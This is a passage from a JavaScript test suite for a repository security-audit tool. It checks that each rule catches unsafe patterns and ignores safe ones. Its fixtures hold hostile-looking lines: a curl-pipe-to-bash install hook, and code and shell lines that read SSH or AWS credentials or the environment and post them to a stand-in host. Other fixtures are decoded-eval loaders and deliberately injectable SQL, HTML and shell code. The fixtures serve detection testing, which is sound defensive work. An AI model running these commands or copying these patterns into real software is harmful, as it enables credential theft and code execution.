'use strict';

/*
 * The repository audit, rule by rule. Each rule is shown firing on the mistake
 * it names and staying quiet on the safe way to write the same thing -- a rule
 * that only ever fires is noise, and a rule tested only on the safe side has
 * never been seen to work.
 */

const assert = require('assert');
const audit = require('../src/code-audit');

function run(files, extra = {}) {
  return audit.analyse({ files, paths: extra.paths || files.map(file => file.path), registry: extra.registry, advisories: extra.advisories, intel: extra.intel });
}
function rules(result) {
  return result.findings.map(finding => `${finding.rule}@${finding.path || '-'}:${finding.line || '-'}`).sort();
}
function fires(label, files, expected, extra) {
  const result = run(files, extra);
  const found = result.findings.map(finding => finding.rule);
  for (const rule of expected) assert(found.includes(rule), `${label}: expected ${rule}, got ${rules(result).join(', ')}`);
  return result;
}
function quiet(label, files, forbidden, extra) {
  const result = run(files, extra);
  const found = result.findings.map(finding => finding.rule);
  for (const rule of forbidden) assert(!found.includes(rule), `${label}: ${rule} must not fire, got ${rules(result).join(', ')}`);
  return result;
}
/* Enough of an ordinary project that the hygiene rules have nothing to say. */
const BASE = [
  { path: 'README.md', text: '# App\n' },
  { path: '.gitignore', text: 'node_modules\n.env\n.env.*\n!.env.example\n' },
  { path: 'package-lock.json', text: '{}' },
  { path: 'test/app.test.js', text: 'test\n' }
];
const paths = files => [...BASE, ...files].map(file => file.path);

/* ---- Supply chain ---------------------------------------------------------- */
{
  const bad = [{ path: 'package.json', text: JSON.stringify({ name: 'x', scripts: { postinstall: 'curl -s https://example.test/p.sh | bash' }, dependencies: { a: '^1.0.0' } }, null, 2) }];
  const result = fires('install script', [...BASE, ...bad], ['SUP-001', 'SUP-002']);
  const finding = result.findings.find(item => item.rule === 'SUP-001');
  assert.strictEqual(finding.line, 4, 'the finding points at the script’s own line');
  assert.strictEqual(finding.severity, 'critical');
  quiet('build script', [...BASE, { path: 'package.json', text: JSON.stringify({ scripts: { postinstall: 'prisma generate', build: 'next build' } }) }], ['SUP-001', 'SUP-002']);

  fires('piped installer', [...BASE, { path: 'Dockerfile', text: 'FROM node:20.11.1\nRUN curl -fsSL https://example.test/setup | sh\n' }], ['SUP-002']);
  quiet('downloaded then verified', [...BASE, { path: 'Dockerfile', text: 'FROM node:20.11.1\nRUN curl -fsSLo setup.sh https://example.test/setup && sha256sum -c setup.sha256 && sh setup.sh\n' }], ['SUP-002']);

  fires('decoded and executed', [...BASE, { path: 'lib/x.js', text: 'eval(atob(payload));\n' }], ['SUP-003']);
  fires('python decoded exec', [...BASE, { path: 'x.py', text: 'exec(base64.b64decode(blob))\n' }], ['SUP-003']);
  quiet('decoding without executing', [...BASE, { path: 'lib/x.js', text: 'const data = JSON.parse(atob(payload));\n' }], ['SUP-003']);

  const blob = 'QUJD'.repeat(400);
  fires('embedded payload', [...BASE, { path: 'lib/p.js', text: `const p = "${blob}";\n` }], ['SUP-004']);
  quiet('inlined image', [...BASE, { path: 'lib/p.js', text: `const img = "data:image/png;base64,${blob}";\n` }], ['SUP-004']);

  fires('environment shipped out', [...BASE, { path: 'lib/t.js', text: 'const body = JSON.stringify(process.env);\nfetch("https://example.test", { method: "POST", body });\n' }], ['SUP-005']);
  fires('credential store read', [...BASE, { path: 'lib/t.js', text: 'const k = fs.readFileSync(os.homedir() + "/.ssh/id_rsa");\n' }], ['SUP-005']);
  quiet('environment read without sending', [...BASE, { path: 'lib/t.js', text: 'const port = process.env.PORT;\n' }], ['SUP-005']);
  /* A website scanner asks a site for the same paths a stealer reads from disk: a URL is not a local read. */
  quiet('credential paths probed on a website', [...BASE, { path: 'lib/probe.js', text: "const PROBES = ['/.git/config', '/.aws/credentials', '/.docker/config.json'];\nconst r = await fetch(new URL(PROBES[0], site));\n" }], ['SUP-005']);
  fires('home directory credentials sent out', [...BASE, { path: 'lib/t.js', text: "const k = fs.readFileSync(path.join(os.homedir(), '.aws/credentials'));\nfetch('https://example.test', { method: 'POST', body: k });\n" }], ['SUP-005']);
  fires('home directory named elsewhere in the file', [...BASE, { path: 'lib/t.js', text: "const home = os.homedir();\nconst p = home + '/.ssh/id_ed25519';\n" }], ['SUP-005']);
  fires('python reads a key from the home directory', [...BASE, { path: 'x.py', text: "key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\nrequests.post('https://example.test', data=key)\n" }], ['SUP-005']);
  fires('a shell script copies the home credentials', [...BASE, { path: 'x.sh', text: 'cat ~/.aws/credentials | curl -X POST --data-binary @- https://example.test\n' }], ['SUP-005']);
  quiet('a shell script probes a website path', [...BASE, { path: 'x.sh', text: 'curl -s https://example.test/.aws/credentials -o /dev/null\n' }], ['SUP-005']);

  fires('git dependency', [...BASE, { path: 'package.json', text: JSON.stringify({ dependencies: { thing: 'github:someone/thing' } }, null, 2) }], ['SUP-006']);
  quiet('workspace dependency', [...BASE, { path: 'package.json', text: JSON.stringify({ dependencies: { thing: 'workspace:*', other: 'file:../other' } }, null, 2) }], ['SUP-006', 'HYG-005']);

  /* Workflows: a privileged checkout of contributed code, event text in a script, a movable action. */
  const expr = inner => ['$', '{{ ', inner, ' }}'].join('');
  const privileged = [
    'on:', '  pull_request_target:', 'jobs:', '  label:', '    runs-on: ubuntu-latest', '    steps:',
    '      - uses: actions/checkout@v4', '        with:', `          ref: ${expr('github.event.pull_request.head.sha')}`,
    '      - run: npm ci && npm test', ''
  ].join('\n');
  const checkout = fires('privileged checkout', [...BASE, { path: '.github/workflows/label.yml', text: privileged }], ['SUP-007']);
  assert.strictEqual(checkout.findings.find(item => item.rule === 'SUP-007').line, 9, 'the finding points at the checkout of the head');
  quiet('unprivileged checkout of the head', [...BASE, { path: '.github/workflows/ci.yml', text: privileged.replace('pull_request_target', 'pull_request') }], ['SUP-007']);
  quiet('privileged job on the base', [...BASE, { path: '.github/workflows/label.yml', text: privileged.replace(/\s+with:\n.*\n/, '\n') }], ['SUP-007']);

  const injected = [
    'on: issues', 'jobs:', '  triage:', '    runs-on: ubuntu-latest', '    steps:',
    `      - run: echo "${expr('github.event.issue.title')}"`,
    '      - name: multi-line', '        run: |', '          echo start', `          echo "${expr('github.head_ref')}"`,
    '      - uses: actions/github-script@v7', '        with:', '          script: |', `            core.info("${expr('github.event.comment.body')}")`, ''
  ].join('\n');
  const injection = fires('event text in scripts', [...BASE, { path: '.github/workflows/triage.yml', text: injected }], ['SUP-009']);
  assert.deepStrictEqual(injection.findings.filter(item => item.rule === 'SUP-009').map(item => item.line), [6, 10, 14]);
  quiet('event text through the environment', [...BASE, { path: '.github/workflows/triage.yml', text: [
    'on: issues', 'jobs:', '  triage:', '    runs-on: ubuntu-latest', '    steps:',
    '      - env:', `          TITLE: ${expr('github.event.issue.title')}`, '        run: echo "$TITLE"',
    `      - if: ${expr("contains(github.event.issue.title, 'bug')")}`, '        run: echo bug',
    `      - run: echo "${expr('github.event.issue.number')}"`, ''
  ].join('\n') }], ['SUP-009']);

  const actions = [
    'on: push', 'jobs:', '  build:', '    runs-on: ubuntu-latest', '    steps:',
    '      - uses: actions/checkout@v4', '      - uses: github/codeql-action/init@v3',
    '      - uses: someone/deploy@v2', '      - uses: someone/tool@main', "      - uses: 'someone/quoted@v1'",
    '      - uses: someone/pinned@0123456789abcdef0123456789abcdef01234567 # v1.2.0', '      - uses: ./.github/actions/local',
    '      - uses: docker://alpine:3.20', '      - uses: docker://alpine@sha256:' + 'a'.repeat(64), ''
  ].join('\n');
  const movable = fires('movable actions', [...BASE, { path: '.github/workflows/build.yml', text: actions }], ['SUP-008']);
  assert.deepStrictEqual(movable.findings.filter(item => item.rule === 'SUP-008').map(item => item.line), [8, 9, 10, 13]);
  quiet('the same actions outside a workflow', [...BASE, { path: 'docs/example.yml', text: actions }], ['SUP-008']);
}

/*
 * ---- Text is not code ------------------------------------------------------
 *
 * A call named inside a string -- a message, a test fixture, a scanner's own
 * rule text -- is not the call. What a template's ${...} or an f-string's
 * {...} holds runs, so hiding a call there does not hide it.
 */
{
  const tpl = inner => ['`', '$', '{', inner, '}', '`'].join('');
  quiet('a call described in a string', [...BASE, { path: 'lib/x.js', text: 'const why = "never eval(atob(x)) here";\nconst tip = \'Math.random() tokens are guessable\';\n' }], ['SUP-003', 'SEC-005']);
  quiet('a fixture of a call', [...BASE, { path: 'lib/x.js', text: 'const sample = { text: \'db.query(`SELECT * FROM t WHERE id = ${id}`)\' };\n' }], ['SEC-001']);
  quiet('a public secret named in a message', [...BASE, { path: 'web/x.ts', text: 'throw new Error("process.env.NEXT_PUBLIC_API_SECRET must not be set");\n' }], ['SEC-006']);
  quiet('a credential path in a pattern', [...BASE, { path: 'lib/x.js', text: 'const store = /\\.ssh\\/id_rsa|Login Data/;\n' }], ['SUP-005']);
  quiet('an escaped f-string brace', [...BASE, { path: 'x.py', text: 'doc = f"{{exec(base64.b64decode(blob))}}"\n' }], ['SUP-003']);
  quiet('CORS options described in a string', [...BASE, { path: 'server.js', text: 'const doc = "cors({ origin: true, credentials: true })";\n' }], ['SEC-003']);

  fires('a call inside a template expression', [...BASE, { path: 'lib/x.js', text: `const s = ${tpl('eval(atob(p))')};\n` }], ['SUP-003']);
  fires('a call inside an f-string', [...BASE, { path: 'x.py', text: 'x = f"{exec(base64.b64decode(blob))}"\n' }], ['SUP-003']);
  fires('a call after a closed string', [...BASE, { path: 'lib/x.js', text: 'const s = "it\\"s"; eval(atob(p));\n' }], ['SUP-003']);
  fires('a call after a string holding the other quote', [...BASE, { path: 'lib/x.js', text: 'const q = "\'"; eval(atob(p));\n' }], ['SUP-003']);
  fires('a credential file named in a string', [...BASE, { path: 'lib/x.js', text: 'send(fs.readFileSync(home + "/.ssh/id_rsa"));\n' }], ['SUP-005']);
  fires('script in an HTML attribute', [...BASE, { path: 'index.html', text: '<a onclick="eval(atob(p))">x</a>\n' }], ['SUP-003']);
}

/* ---- Code security ----------------------------------------------------------- */
{
  fires('SQL template', [...BASE, { path: 'api/users.js', text: 'db.query(`SELECT * FROM users WHERE id = ${req.params.id}`);\n' }], ['SEC-001']);
  fires('SQL concat', [...BASE, { path: 'api/users.js', text: 'db.query("SELECT * FROM users WHERE id = " + id);\n' }], ['SEC-001']);
  fires('python f-string SQL', [...BASE, { path: 'app.py', text: 'cur.execute(f"SELECT * FROM users WHERE id = {uid}")\n' }], ['SEC-001']);
  quiet('parameterised SQL', [...BASE, { path: 'api/users.js', text: 'db.query("SELECT * FROM users WHERE id = $1", [id]);\nconst rows = await sql`SELECT * FROM users WHERE id = ${id}`;\n' }], ['SEC-001']);
  /* The code's own SQL, kept in a constant, is not a value a caller sends. */
  {
    const tpl = (...parts) => parts.join('');
    const scoped = "const SCOPE_SQL = 'owner=$1 AND repo=$2';\nconst COLUMNS = `id, name,\n  created_at`;\n\nasync function remove(client, base) {\n" +
      tpl('  await client.query(`DELETE FROM t WHERE ', '$', '{SCOPE_SQL}`, base);\n') +
      tpl('  return client.query(`SELECT ', '$', '{COLUMNS} FROM t WHERE ', '$', '{SCOPE_SQL}`, base);\n}\n');
    quiet('a module constant spliced into SQL', [...BASE, { path: 'src/store.js', text: scoped }], ['SEC-001']);
    quiet('a python module constant spliced into SQL', [...BASE, { path: 'store.py', text: 'SCOPE = "owner = %s"\n\ndef remove(cur, owner):\n    cur.execute(f"DELETE FROM t WHERE {SCOPE}", (owner,))\n' }], ['SEC-001']);
    fires('a reassignable variable spliced into SQL', [...BASE, { path: 'src/store.js', text: "let where = 'owner=$1';\nwhere = req.query.filter;\n" + tpl('db.query(`DELETE FROM t WHERE ', '$', '{where}`);\n') }], ['SEC-001']);
    fires('a constant shadowed by a parameter', [...BASE, { path: 'src/store.js', text: "const where = 'owner=$1';\nfunction remove(where) {\n" + tpl('  return db.query(`DELETE FROM t WHERE ', '$', '{where}`);\n}\n') }], ['SEC-001']);
    fires('a constant built from a value', [...BASE, { path: 'src/store.js', text: "const where = 'owner=' + process.argv[2];\n" + tpl('db.query(`DELETE FROM t WHERE ', '$', '{where}`);\n') }], ['SEC-001']);
    fires('a constant template that splices', [...BASE, { path: 'src/store.js', text: tpl("const where = `owner='", '$', "{process.argv[2]}'`;\n") + tpl('db.query(`DELETE FROM t WHERE ', '$', '{where}`);\n') }], ['SEC-001']);
  }

  /* A comment that describes a sink is not the sink, whether it has the line or follows code. */
  quiet('a sink named in a block comment', [...BASE, { path: 'src/flow.js', text: '      /* dangerouslySetInnerHTML={{ __html: value }} */\nconst x = 1;\n' }], ['SEC-002']);
  quiet('a sink named after code', [...BASE, { path: 'src/flow.js', text: 'const ok = true; // dangerouslySetInnerHTML={{ __html: value }}\n' }], ['SEC-002']);
  fires('a sink before a comment', [...BASE, { path: 'web/x.jsx', text: 'const el = <div dangerouslySetInnerHTML={{ __html: value }} />; // render\n' }], ['SEC-002']);
  quiet('a url in a string is not a comment', [...BASE, { path: 'src/x.js', text: 'const u = "https://example.test"; el.innerHTML = location.hash;\n' }], []);
  fires('code after a url string still runs', [...BASE, { path: 'src/x.js', text: 'const u = "https://example.test"; el.innerHTML = location.hash;\n' }], ['SEC-002']);

  fires('untrusted innerHTML', [...BASE, { path: 'web/a.js', text: 'el.innerHTML = `<p>${comment.body}</p>`;\n' }], ['SEC-002']);
  fires('location into innerHTML', [...BASE, { path: 'web/a.js', text: 'out.innerHTML = location.hash;\n' }], ['SEC-002']);
  fires('React raw HTML', [...BASE, { path: 'web/a.jsx', text: '<div dangerouslySetInnerHTML={{ __html: post.html }} />\n' }], ['SEC-002']);
  quiet('escaped or constant markup', [...BASE, { path: 'web/a.js', text: 'el.innerHTML = `<p>${esc(comment.body)}</p>`;\nicon.innerHTML = `<svg>${ICONS.star}</svg>`;\nel.textContent = comment.body;\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.html) }} />\n' }], ['SEC-002']);

  fires('credentialed wildcard CORS', [...BASE, { path: 'server.js', text: 'app.use(cors({ origin: true, credentials: true }));\n' }], ['SEC-003']);
  quiet('allow-listed CORS', [...BASE, { path: 'server.js', text: 'app.use(cors({ origin: ["https://app.example.test"], credentials: true }));\n' }], ['SEC-003']);

  fires('insecure cookie', [...BASE, { path: 'server.js', text: 'res.cookie("session", token, { secure: false });\n' }], ['SEC-004']);
  quiet('hardened cookie', [...BASE, { path: 'server.js', text: 'res.cookie("session", token, { httpOnly: true, secure: true, sameSite: "lax" });\n' }], ['SEC-004']);

  fires('weak token randomness', [...BASE, { path: 'lib/t.js', text: 'const resetToken = Math.random().toString(36).slice(2);\n' }], ['SEC-005']);
  fires('python weak randomness', [...BASE, { path: 'lib/t.py', text: 'otp = random.randint(100000, 999999)\n' }], ['SEC-005']);
  quiet('crypto randomness and a jitter', [...BASE, { path: 'lib/t.js', text: 'const resetToken = crypto.randomUUID();\nconst delay = Math.random() * 100;\n' }], ['SEC-005']);
  fires('weak reset code', [...BASE, { path: 'lib/t.js', text: 'const reset_code = Math.floor(Math.random() * 1e6);\nconst inviteLink = `/join/${Math.random().toString(36)}`;\n' }], ['SEC-005']);
  quiet('a key that only forces a re-render', [...BASE, { path: 'lib/t.js', text: 'const initial = { resetFileKey: Math.floor((Math.random() * 0x10000)) };\nconst inviteModalKey = Math.random();\n' }], ['SEC-005']);

  fires('public secret in code', [...BASE, { path: 'web/pay.ts', text: 'const key = process.env.NEXT_PUBLIC_STRIPE_SECRET_KEY;\n' }], ['SEC-006']);
  fires('public secret in env example', [...BASE, { path: '.env.example', text: 'VITE_SUPABASE_SERVICE_ROLE_KEY=\n' }], ['SEC-006']);
  quiet('public keys that are meant to be public', [...BASE, { path: 'web/pay.ts', text: 'const a = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;\nconst b = process.env.STRIPE_SECRET_KEY;\nfail("PUBLIC_ALPHA_SECRET_MATERIAL");\n' }], ['SEC-006']);

  fires('unsigned webhook', [...BASE, { path: 'server.js', text: 'app.post("/api/stripe/webhook", express.json(), (req, res) => {\n  markPaid(req.body);\n});\n' }], ['SEC-007']);
  fires('unsigned Next webhook', [...BASE, { path: 'app/api/webhook/route.ts', text: 'export async function POST(req) {\n  const event = await req.json();\n}\n' }], ['SEC-007']);
  quiet('signed webhook', [...BASE, { path: 'server.js', text: 'app.post("/api/stripe/webhook", (req, res) => {\n  const event = stripe.webhooks.constructEvent(req.body, req.headers["stripe-signature"], secret);\n});\n' }], ['SEC-007']);

  fires('TLS off', [...BASE, { path: 'lib/h.js', text: 'const agent = new https.Agent({ rejectUnauthorized: false });\n' }], ['SEC-008']);
  fires('python TLS off', [...BASE, { path: 'lib/h.py', text: 'requests.get(url, verify=False)\n' }], ['SEC-008']);
  quiet('TLS on', [...BASE, { path: 'lib/h.js', text: 'const agent = new https.Agent({ ca: bundle });\n' }], ['SEC-008']);

  fires('alg none', [...BASE, { path: 'lib/j.js', text: 'jwt.verify(t, k, { algorithms: ["none"] });\n' }], ['SEC-009']);
  const decodeOnly = fires('decoded, never verified', [...BASE, { path: 'lib/j.js', text: 'const claims = jwt.decode(token);\n' }], ['SEC-009']);
  assert.strictEqual(decodeOnly.findings.find(item => item.rule === 'SEC-009').severity, 'warning', 'a decode alone is a warning: it may be for display');
  quiet('verified token', [...BASE, { path: 'lib/j.js', text: 'const claims = jwt.verify(token, key, { algorithms: ["HS256"] });\n' }], ['SEC-009']);

  fires('eval of a request', [...BASE, { path: 'api/calc.js', text: 'res.json(eval(req.body.expr));\n' }], ['SEC-010']);
  quiet('parse of a request', [...BASE, { path: 'api/calc.js', text: 'res.json(JSON.parse(req.body.expr));\n' }], ['SEC-010']);

  fires('shell interpolation', [...BASE, { path: 'api/zip.js', text: 'execSync(`zip -r out.zip ${req.query.dir}`);\n' }], ['SEC-011']);
  fires('python shell=True', [...BASE, { path: 'api/zip.py', text: 'subprocess.run(f"zip -r out.zip {d}", shell=True)\n' }], ['SEC-011']);
  quiet('argument array', [...BASE, { path: 'api/zip.js', text: 'execFileSync("zip", ["-r", "out.zip", dir]);\n' }], ['SEC-011']);

  fires('login without a limit', [...BASE, { path: 'server.js', text: 'app.post("/api/login", handler);\n' }], ['SEC-012']);
  quiet('login with a limit', [...BASE, { path: 'server.js', text: 'const limiter = rateLimit({ windowMs: 60000, max: 5 });\napp.post("/api/login", limiter, handler);\n' }], ['SEC-012']);

  fires('django debug', [...BASE, { path: 'site/settings.py', text: 'DEBUG = True\n' }], ['SEC-013']);
  quiet('debug from the environment', [...BASE, { path: 'site/settings.py', text: 'DEBUG = os.environ.get("DEBUG") == "1"\n' }], ['SEC-013']);

  /* Tests may do all of this on purpose, and are not the application. */
  quiet('tests are not the application', [...BASE, { path: 'test/sql.test.js', text: 'db.query(`SELECT * FROM ${table}`);\n' }], ['SEC-001']);
  /* A comment that names a pattern is not the pattern. */
  quiet('a comment', [...BASE, { path: 'lib/x.js', text: '// never do eval(atob(x)) here\n' }], ['SUP-003']);
}

/* ---- Dependencies ---------------------------------------------------------------- */
{
  const manifest = { path: 'package.json', text: JSON.stringify({ dependencies: { react: '^18.2.0', 'react-hooks-helperz': '^1.0.0', '@acme/internal': '^2.0.0', 'left-pad': '^1.3.0' } }, null, 2) };
  const registry = new Map([
    ['npm:react', 'exists'], ['npm:react-hooks-helperz', 'missing'], ['npm:@acme/internal', 'missing'], ['npm:left-pad', 'unknown']
  ]);
  const result = run([...BASE, manifest], { registry });
  const byRule = result.findings.filter(item => item.category === 'dependencies');
  assert.deepStrictEqual(byRule.map(item => item.rule).sort(), ['DEP-001', 'DEP-002']);
  assert.strictEqual(byRule.find(item => item.rule === 'DEP-001').line, manifest.text.split('\n').findIndex(line => line.includes('react-hooks-helperz')) + 1);
  assert.deepStrictEqual(result.dependencyStatus, { checked: 4, missing: 2, unknown: 1 }, 'an unreachable registry is unknown, never missing');

  const python = { path: 'requirements.txt', text: 'Flask==3.0.0\nrequests_toolbelt>=1\n# a comment\n-r other.txt\n' };
  const answers = new Map([['pypi:flask', 'exists'], ['pypi:requests-toolbelt', 'missing']]);
  const pythonResult = run([...BASE, python], { registry: answers });
  assert.deepStrictEqual(pythonResult.findings.filter(item => item.rule === 'DEP-001').map(item => item.line), [2], 'PyPI names are normalised before they are compared');

  assert.strictEqual(audit.registryUrl({ ecosystem: 'npm', name: '@acme/internal' }), 'https://registry.npmjs.org/@acme%2Finternal');
  assert.strictEqual(audit.registryUrl({ ecosystem: 'pypi', name: 'Requests_Toolbelt' }), 'https://pypi.org/pypi/requests-toolbelt/json');
}

/* ---- Requests handed to a redirect, a fetch or the file system ------------------- */
{
  fires('open redirect', [...BASE, { path: 'src/auth.js', text: 'app.get("/done", (req, res) => res.redirect(req.query.next));\n' }], ['SEC-020']);
  fires('flask open redirect', [...BASE, { path: 'app.py', text: 'return redirect(request.args.get("next"))\n' }], ['SEC-020']);
  quiet('fixed redirect', [...BASE, { path: 'src/auth.js', text: 'res.redirect(safeNext(req.query.next) || "/");\nres.redirect("/home");\n' }], ['SEC-020']);

  fires('request-forged fetch', [...BASE, { path: 'src/proxy.js', text: 'const upstream = await fetch(req.query.url);\n' }], ['SEC-021']);
  fires('python request forgery', [...BASE, { path: 'app.py', text: 'r = requests.get(request.args["u"], timeout=5)\n' }], ['SEC-021']);
  quiet('fetch of a known host', [...BASE, { path: 'src/proxy.js', text: 'const upstream = await fetch(`https://api.example.test/items/${encodeURIComponent(req.query.id)}`);\n' }], ['SEC-021']);

  fires('path from the request', [...BASE, { path: 'src/files.js', text: 'res.sendFile(path.join(__dirname, "uploads", req.params.name));\n' }], ['SEC-022']);
  fires('python path from the request', [...BASE, { path: 'app.py', text: 'return send_file(os.path.join(BASE, request.args["f"]))\n' }], ['SEC-022']);
  quiet('path reduced to a name', [...BASE, { path: 'src/files.js', text: 'res.sendFile(path.join(UPLOADS, path.basename(String(req.params.name))));\n' }], ['SEC-022']);
  quiet('said in a string', [...BASE, { path: 'src/doc.js', text: 'const hint = "never write res.redirect(req.query.next) or fetch(req.query.url)";\n' }], ['SEC-020', 'SEC-021']);
}

/* ---- Database rules: Supabase row level security and Firebase ------------------- */
{
  const supabase = { path: 'package.json', text: JSON.stringify({ dependencies: { '@supabase/supabase-js': '^2.45.0' } }, null, 2) };
  const migration = [
    '-- profiles; this comment mentions create table fake (id int);',
    'create table public.profiles (',
    '  id uuid primary key,',
    "  bio text default 'a; b'",
    ');',
    'create table if not exists "orders" (id bigint);',
    'alter table orders enable row level security;',
    'create table notes (id int);',
    'alter table notes enable row level security;',
    'alter table notes disable row level security;',
    'create policy "anyone writes" on orders for insert with check (true);',
    'create policy "anyone reads" on orders for select using (true);',
    'create function f() returns void as $$ begin perform 1; end; $$ language plpgsql;',
    'create table private.audit_log (id int);'
  ].join('\n');
  const result = fires('open tables', [...BASE, supabase, { path: 'supabase/migrations/20240101000000_init.sql', text: migration }], ['SEC-014', 'SEC-015', 'SEC-016']);
  const at = rule => result.findings.filter(item => item.rule === rule).map(item => item.line);
  assert.deepStrictEqual(at('SEC-015'), [2], 'profiles is created in public and never protected; orders is protected; a private schema is not served');
  assert.deepStrictEqual(at('SEC-014'), [10], 'notes ends up disabled');
  assert.deepStrictEqual(at('SEC-016'), [11], 'an open insert policy; a public read policy is often the point');
  assert.strictEqual(result.findings.find(item => item.rule === 'SEC-014').severity, 'critical');

  /* A later migration that fixes an earlier one is fixed. */
  quiet('fixed later', [...BASE, supabase,
    { path: 'supabase/migrations/20240101_a.sql', text: 'create table profiles (id int);\nalter table profiles disable row level security;\n' },
    { path: 'supabase/migrations/20240202_b.sql', text: 'alter table public.profiles enable row level security;\n' }], ['SEC-014', 'SEC-015']);
  /* Without Supabase, a table without row level security is how most databases work. */
  quiet('plain postgres', [...BASE, { path: 'db/schema.sql', text: 'create table users (id int);\n' }], ['SEC-015']);

  const firestore = [
    "rules_version = '2';",
    'service cloud.firestore {',
    '  match /databases/{database}/documents {',
    '    match /products/{id} {',
    '      allow read: if true;',
    '    }',
    '    match /{document=**} {',
    '      allow read, write: if request.time < timestamp.date(2030, 1, 1);',
    '    }',
    '  }',
    '}'
  ].join('\n');
  const rules = fires('test-mode rules', [...BASE, { path: 'firestore.rules', text: firestore }], ['SEC-017']);
  assert.deepStrictEqual(rules.findings.filter(item => item.rule === 'SEC-017').map(item => item.line), [8]);
  assert(!rules.findings.some(item => item.rule === 'SEC-018'), 'a public product catalogue is not a leak');
  const everything = fires('catch-all read', [...BASE, { path: 'firestore.rules', text: firestore.replace('allow read, write: if request.time < timestamp.date(2030, 1, 1);', 'allow read: if true;\n      allow write: if request.auth != null;') }], ['SEC-018']);
  assert(!everything.findings.some(item => item.rule === 'SEC-017'));
  quiet('owner-only rules', [...BASE, { path: 'firestore.rules', text: 'service cloud.firestore {\n  match /databases/{database}/documents {\n    match /users/{uid} {\n      allow read, write: if request.auth != null && request.auth.uid == uid;\n    }\n  }\n}\n' }], ['SEC-017', 'SEC-018']);
  fires('realtime database open', [...BASE, { path: 'database.rules.json', text: '{\n  "rules": {\n    ".read": true,\n    ".write": true\n  }\n}\n' }], ['SEC-017', 'SEC-018']);
  quiet('realtime database closed', [...BASE, { path: 'database.rules.json', text: '{ "rules": { ".read": "auth != null", ".write": false } }' }], ['SEC-017', 'SEC-018']);

  fires('service role in a client component', [...BASE, { path: 'app/dashboard/page.tsx', text: '"use client";\nconst admin = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY);\n' }], ['SEC-019']);
  quiet('service role on the server', [...BASE, { path: 'app/api/admin/route.ts', text: '"use client";\nconst admin = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY);\n' },
    { path: 'lib/admin.ts', text: 'const admin = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY);\n' }], ['SEC-019']);
}

/* ---- Secrets ------------------------------------------------------------------- */
{
  const token = `gh${'p'}_${'A'.repeat(36)}`;
  const result = fires('committed token', [...BASE, { path: 'scripts/release.sh', text: `#!/bin/sh\nexport GITHUB_TOKEN=${token}\n` }], ['SCR-001']);
  const finding = result.findings.find(item => item.rule === 'SCR-001');
  assert.strictEqual(finding.line, 2);
  assert.strictEqual(finding.category, 'secrets');
  assert.strictEqual(finding.severity, 'critical');
  assert.strictEqual(finding.detail.credential, 'GitHub access token');
  assert(!JSON.stringify(result).includes(token), 'the credential never leaves the audit');
  assert.match(finding.prompt, /\(GitHub access token\)/);
  assert.strictEqual(result.categories.find(category => category.id === 'secrets').score, 60);
  quiet('placeholder', [...BASE, { path: '.env.example', text: 'GITHUB_TOKEN=\nSTRIPE_KEY=your-key-here\n' }], ['SCR-001']);
  quiet('a fixture in a test', [...BASE, { path: 'test/release.test.js', text: `const token = '${token}';\n` }], ['SCR-001']);
  const local = ['postgresql://postgres:', 'postgres@localhost:5432/app'].join('');
  const remote = ['postgresql://app:', 'Sup3rS3cretPassw0rd@db.example.com:5432/app'].join('');
  quiet('a local database', [...BASE, { path: '.github/workflows/ci.yml', text: `env:\n  DATABASE_URL: ${local}\n` }], ['SCR-001']);
  fires('a remote database', [...BASE, { path: 'deploy/config.yml', text: `env:\n  DATABASE_URL: ${remote}\n` }], ['SCR-001']);
}

/* ---- Published vulnerabilities and look-alike names ------------------------------ */
{
  const manifest = { path: 'package.json', text: JSON.stringify({
    dependencies: { lodash: '^4.17.0', axios: '^1.6.0', crossenv: '^1.0.0', 'left-pad': '1.3.0', 'event-stream': '3.3.6' },
    devDependencies: { minimist: '^1.2.0' }
  }, null, 2) };
  const lock = { path: 'package-lock.json', text: JSON.stringify({
    lockfileVersion: 3,
    packages: {
      '': { name: 'app' },
      'node_modules/lodash': { version: '4.17.15' },
      'node_modules/axios': { version: '1.7.4' },
      'node_modules/crossenv': { version: '1.0.0' },
      'node_modules/minimist': { version: '1.2.5', dev: true },
      'node_modules/follow-redirects': { version: '1.15.5' },
      'node_modules/linked': { link: true }
    }
  }, null, 2) };
  const inventory = audit.dependencyInventory([manifest, lock]);
  const summary = inventory.map(entry => `${entry.name}@${entry.version}:${entry.source}:${entry.direct ? 'direct' : 'transitive'}${entry.dev ? ':dev' : ''}`).sort();
  assert.deepStrictEqual(summary, [
    'axios@1.7.4:lock:direct', 'crossenv@1.0.0:lock:direct', 'event-stream@3.3.6:pin:direct', 'follow-redirects@1.15.5:lock:transitive',
    'left-pad@1.3.0:pin:direct', 'lodash@4.17.15:lock:direct', 'minimist@1.2.5:lock:direct:dev'
  ], 'installed versions from the lockfile, exact pins when it has none, what came with them');
  assert(inventory.slice(0, 6).every(entry => entry.direct), 'declared packages are asked about first');

  /* A fixture project a test reads is not an install of the application: neither its inventory nor its advisories. */
  {
    const fixture = { path: 'test/fixtures/next-app/package.json', text: JSON.stringify({ name: 'next-app', dependencies: { next: '14.2.0', lodash: '4.17.15' } }) };
    const read = audit.readDependencies([manifest, lock, fixture]);
    assert(!read.inventory.some(entry => entry.path === fixture.path), 'a fixture manifest adds nothing to the inventory');
    assert(!read.inventory.some(entry => entry.name === 'next'), 'nor borrows the root lockfile for its packages');
    assert.deepStrictEqual(read.setAside, [fixture.path]);
    const fixtureAdvice = new Map([['npm:next@14.2.0', { advisories: [{ id: 'GHSA-f82v-jwr5-mffw', cve: 'CVE-2025-29927', severity: 'critical', summary: 'Authorization bypass in middleware', fixed: '14.2.25', malicious: false }] }]]);
    const kept = run([...BASE, fixture, { path: 'testdata/py/requirements.txt', text: 'django==2.0.0\n' }], { advisories: fixtureAdvice });
    assert(!kept.findings.some(item => item.category === 'dependencies'), 'no advisory, look-alike or registry finding comes from a fixture');
    assert.strictEqual(kept.manifestsSetAside, 2);
    assert.notStrictEqual(kept.grade, 'F');
  }

  const advisories = new Map([
    ['npm:lodash@4.17.15', { advisories: [{ id: 'GHSA-35jh-r3h4-6jhm', cve: 'CVE-2021-23337', severity: 'serious', summary: 'Command injection in template', fixed: '4.17.21', malicious: false },
